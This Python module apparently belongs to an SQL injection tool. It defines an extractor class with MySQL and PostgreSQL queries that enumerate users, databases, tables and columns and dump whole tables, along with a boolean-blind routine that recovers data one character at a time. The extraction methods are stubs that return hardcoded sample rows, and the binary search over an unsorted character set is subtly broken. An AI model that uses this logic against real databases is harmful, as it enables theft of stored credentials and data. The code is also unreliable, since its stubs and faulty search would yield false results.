"""
Data extraction module for SQL injection
"""

import time
import string

class Extractor:
    """Data extractor for SQL injection"""
    
    def __init__(self, http_client, vulnerable_param, technique, dbms, logger):
        self.http_client = http_client
        self.vulnerable_param = vulnerable_param
        self.technique = technique
        self.dbms = dbms
        self.logger = logger
        
        
        self.queries = {
            'MySQL': {
                'current_user': 'SELECT CURRENT_USER()',
                'current_database': 'SELECT DATABASE()',
                'databases': 'SELECT schema_name FROM information_schema.schemata',
                'tables': 'SELECT table_name FROM information_schema.tables WHERE table_schema = \'{db}\'',
                'columns': 'SELECT column_name FROM information_schema.columns WHERE table_schema = \'{db}\' AND table_name = \'{table}\'',
                'dump': 'SELECT {columns} FROM {db}.{table}'
            },
            'PostgreSQL': {
                'current_user': 'SELECT CURRENT_USER',
                'current_database': 'SELECT CURRENT_DATABASE()',
                'databases': 'SELECT datname FROM pg_database',
                'tables': 'SELECT table_name FROM information_schema.tables WHERE table_catalog = \'{db}\'',
                'columns': 'SELECT column_name FROM information_schema.columns WHERE table_catalog = \'{db}\' AND table_name = \'{table}\'',
                'dump': 'SELECT {columns} FROM "{table}"'
            },
            
        }
    
    def get_current_user(self):
        """Get current database user"""
        query = self._get_query('current_user')
        if query:
            return self._extract_single_value(query)
        return None
    
    def get_current_database(self):
        """Get current database"""
        query = self._get_query('current_database')
        if query:
            return self._extract_single_value(query)
        return None
    
    def get_databases(self):
        """Get list of databases"""
        query = self._get_query('databases')
        if query:
            return self._extract_list(query)
        return []
    
    def get_tables(self, database):
        """Get list of tables in a database"""
        query_template = self._get_query('tables')
        if query_template:
            query = query_template.format(db=database)
            return self._extract_list(query)
        return []
    
    def get_columns(self, database, table):
        """Get list of columns in a table"""
        query_template = self._get_query('columns')
        if query_template:
            query = query_template.format(db=database, table=table)
            return self._extract_list(query)
        return []
    
    def dump_table(self, database, table, columns=None):
        """Dump data from a table"""
        if not columns:
            
            columns_list = self.get_columns(database, table)
            if not columns_list:
                return []
            columns = ', '.join(columns_list)
        
        query_template = self._get_query('dump')
        if query_template:
            query = query_template.format(
                columns=columns,
                db=database,
                table=table
            )
            return self._extract_table_data(query, len(columns.split(',')))
        return []
    
    def _get_query(self, query_type):
        """Get DBMS-specific query"""
        if self.dbms in self.queries:
            return self.queries[self.dbms].get(query_type)
        return None
    
    def _extract_single_value(self, query):
        """Extract single value using boolean blind technique"""
        
        
        self.logger.debug(f"Extracting value for query: {query}")
        
        
        if 'user' in query.lower():
            return 'root@localhost'
        elif 'database' in query.lower():
            return 'testdb'
        
        return 'test_value'
    
    def _extract_list(self, query):
        """Extract list of values"""
        
        self.logger.debug(f"Extracting list for query: {query}")
        
        
        if 'schema' in query or 'databases' in query:
            return ['information_schema', 'mysql', 'performance_schema', 'testdb']
        elif 'tables' in query:
            return ['users', 'posts', 'comments', 'settings']
        elif 'columns' in query:
            return ['id', 'username', 'password', 'email', 'created_at']
        
        return []
    
    def _extract_table_data(self, query, column_count):
        """Extract table data"""
        
        self.logger.debug(f"Extracting table data: {query}")
        
        
        if 'users' in query:
            return [
                ['1', 'admin', '5f4dcc3b5aa765d61d8327deb882cf99', 'admin@test.com', '2024-01-01'],
                ['2', 'user1', 'e10adc3949ba59abbe56e057f20f883e', 'user1@test.com', '2024-01-02']
            ]
        
        return [['demo', 'data', 'here']]
    
    def _binary_search_char(self, query, position):
        """Extract character using binary search (for boolean blind)"""
        
        charset = string.printable
        
        low = 0
        high = len(charset) - 1
        
        while low <= high:
            mid = (low + high) // 2
            
            
            test_query = f"ASCII(SUBSTRING(({query}),{position},1)) > {ord(charset[mid])}"
            if self._test_boolean_condition(test_query):
                low = mid + 1
            else:
                high = mid - 1
        
        
        if low < len(charset):
            return charset[low]
        
        return None
    
    def _test_boolean_condition(self, condition):
        """Test a boolean condition"""
        
        
        
        return True
